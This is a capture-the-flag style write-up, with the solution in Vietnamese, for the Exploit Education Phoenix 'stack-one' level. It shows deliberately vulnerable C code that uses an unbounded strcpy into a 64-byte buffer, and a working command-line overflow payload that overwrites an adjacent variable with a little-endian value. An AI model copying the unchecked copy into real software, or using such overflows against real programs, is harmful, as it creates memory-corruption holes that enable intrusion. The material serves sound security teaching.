## <center>[STACK ONE](https://exploit.education/phoenix/stack-one/)</center>


>This level looks at the concept of modifying variables to specific values in the program, and how the variables are laid out in memory.
>This level can be found at /opt/phoenix/<architecture>/stack-one
> ##### Hints:
> + man ascii can tell you what the hexadecimal characters are.
> + Having troubles? How does the endianness of the architecture affect the layout of how variables are laid out?

#### Source code
```c
/*
 * phoenix/stack-one, by https://exploit.education
 *
 * The aim is to change the contents of the changeme variable to 0x496c5962
 *
 * Did you hear about the kid napping at the local school?
 * It's okay, they woke up.
 *
 */

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

int main(int argc, char **argv) {
  struct {
    char buffer[64];
    volatile int changeme;
  } locals;

  printf("%s\n", BANNER);

  if (argc < 2) {
    errx(1, "specify an argument, to be copied into the \"buffer\"");
  }

  locals.changeme = 0;
  strcpy(locals.buffer, argv[1]);

  if (locals.changeme == 0x496c5962) {
    puts("Well done, you have successfully set changeme to the correct value");
  } else {
    printf("Getting closer! changeme is currently 0x%08x, we want 0x496c5962\n",
        locals.changeme);
  }

  exit(0);
}
```
### Solution:
+ Cũng tương tự [stack-zero](https://exploit.education/phoenix/stack-zero/) để hoàn thành level này thì ta cũng truyền đối số đầu vào để làm tràn bộ nhớ đệm của biến `buffer` và sẽ làm thay đổi giá trị của `changeme` nhưng khác một chút đó là ta sẽ làm biến `changeme` thay đổi thành giá trị mà đề yêu cầu là `0x496c5962`
+ Vì kiến trúc sử dụng lưu trữ dữ liệu theo kiểu [little-endian](https://viblo.asia/p/little-endian-vs-big-endian-E375z0pWZGW) nên ta cần đảo ngược các bit của `0x496c5962`
```
user@phoenix-amd64:/opt/phoenix/amd64$ ./stack-one $(python -c "print 'a'*64 + '\x62\x59\x6c\x49'")
Welcome to phoenix/stack-one, brought to you by https://exploit.education
Well done, you have successfully set changeme to the correct value
```